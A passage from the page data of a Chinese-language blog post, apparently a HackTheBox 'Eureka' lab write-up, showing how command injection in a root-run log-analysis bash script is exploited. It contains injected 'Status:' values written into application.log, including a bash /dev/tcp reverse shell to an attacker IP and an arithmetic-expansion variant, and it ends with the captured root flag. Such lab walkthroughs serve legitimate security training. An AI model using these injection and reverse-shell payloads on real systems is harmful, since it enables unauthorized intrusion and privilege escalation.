class=\"hljs-variable\"\u003e$OUTPUT_FILE\u003c/span\u003e\"\u003c/span\u003e  \u003cspan class=\"hljs-comment\"\u003e# 分析日志错误并追加到输出文件\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e -e \u003cspan class=\"hljs-string\"\u003e\"\\n\u003cspan class=\"hljs-variable\"\u003e${GREEN}\u003c/span\u003eAnalysis completed. Results saved to $OUTPUT_FILE\u003cspan class=\"hljs-variable\"\u003e${RESET}\u003c/span\u003e\"\u003c/span\u003e  \u003cspan class=\"hljs-comment\"\u003e# 输出分析完成消息\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后发现一些可能存在命令注入的地方\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eusername=$(\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$line\u003c/span\u003e\"\u003c/span\u003e | awk -F\u003cspan class=\"hljs-string\"\u003e\"'\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'{print $2}'\u003c/span\u003e)  \u003cspan class=\"hljs-comment\"\u003e# 从日志行中提取用户名\u003c/span\u003e\ncode=$(\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$line\u003c/span\u003e\"\u003c/span\u003e | grep -oP \u003cspan class=\"hljs-string\"\u003e'Status: \\K.*'\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e对这里进行测试\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Eureka \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-subst\"\u003e$(echo 1 \u003e\u003e 1.txt)\u003c/span\u003e\"\u003c/span\u003e | grep -oP \u003cspan class=\"hljs-string\"\u003e'Status: \\K.*'\u003c/span\u003e\n\n➜  Eureka \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e 1.txt\n\n1\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e命令注入\u003c/h3\u003e\n\u003cp\u003e在靶机上测试\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003erm\u003c/span\u003e -r /var/www/web/user-management-service/log/application.log\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"Status: \u003cspan class=\"hljs-subst\"\u003e$(echo 1 \u003e\u003e /home/miranda-wise/1.txt)\u003c/span\u003e\"\u003c/span\u003e \u003e /var/www/web/user-management-service/log/application.log\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Eureka/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e成功，进行反弹 \u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"Status: \u003cspan class=\"hljs-subst\"\u003e$(/bin/bash -c 'bash -i \u003e\u0026#x26; /dev/tcp/10.10.16.59/1234 0\u003e\u0026#x26;1')\u003c/span\u003e\"\u003c/span\u003e \u003e /var/www/web/user-management-service/log/application.log\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e但是直接注入会以当前用户执行，所以我们需要对其进行改造\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Eureka/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这样就不会直接执行，而是先写入到日志文件中\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'HTTP Status: x[$(/bin/bash -i \u003e\u0026#x26; /dev/tcp/10.10.16.59/1234 0\u003e\u0026#x26;1)]'\u003c/span\u003e \u003e /var/www/web/user-management-service/log/application.log\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Eureka/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e读取 \u003ccode\u003eroot.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e root.txt\n2a29dd1a4d1172b24ca76dd452035829\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e信息收集是真的很重要，对收集到信息去仔细分析，总是会找到有用的。\u003c/p\u003e","title":"HackTheBox - Machine - Eureka","date":"2025-04-28","updated":"2025-04-28","comments":true,"tags":["Linux靶机","HackTheBox","Spring","Eureka","命令注入","encrypt"],"categories":"靶机","description":"Machine - Eureka\n\n https://app.hackthebox.com/machines/Eureka | `Hard`\n \n\nPS：尤里卡发动！所有奇观建造提速 30% !\n\n前期踩点\n\n\n\n\n\nWeb 渗透\n\n信息收集\n\nWhatWeb\n\n\n\n\n\n页面上的一些操作要进行登陆后才能进行操作\n\n\n\n抓个包分析一下框架\n\n\n\nnginx 是前端 Web Server（反代或直接服...","isEncrypted":true},"recentPosts":[{"id":"HackTheBoxSeason8 - Mirage","title":"HackTheBox - Season8 - Mirage","date":"2025-07-22","isEncrypted":true,"year":"2025","month":"07","day":"22"},{"id":"TheHackersLabsCuriosity2","title":"TheHackersLabs - Curiosity2","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"},{"id":"TheHackersLabsCuriosity","title":"TheHackersLabs - Curiosity","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"},{"id":"TheHackersLabsB I G","title":"TheHackersLabs - B.I.G","date":"2025-07-18","isEncrypted":false,"year":"2025","month":"07","day":"18"},{"id":"TheHackersLabsBlackGold","title":"TheHackersLabs - BlackGold","date":"2025-07-15","isEncrypted":false,"year":"2025","month":"07","day":"15"},{"id":"TheHackersLabsSedition","title":"TheHackersLabs - Sedition","date":"2025-07-14","isEncrypted":false,"year":"2025","month":"07","day":"14"},{"id":"HackMyVMXimai","title":"HackMyVM - Ximai","date":"2025-07-14","isEncrypted":false,"year":"2025","month":"07","day":"14"}]},"__N_SSG":true},"page":"/[year]/[month]/[day]/[id]","query":{"year":"2025","month":"04","day":"28","id":"HackTheBoxMachine - Eureka"},"buildId":"pHM-E_zYUcTxr25rLOgva","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>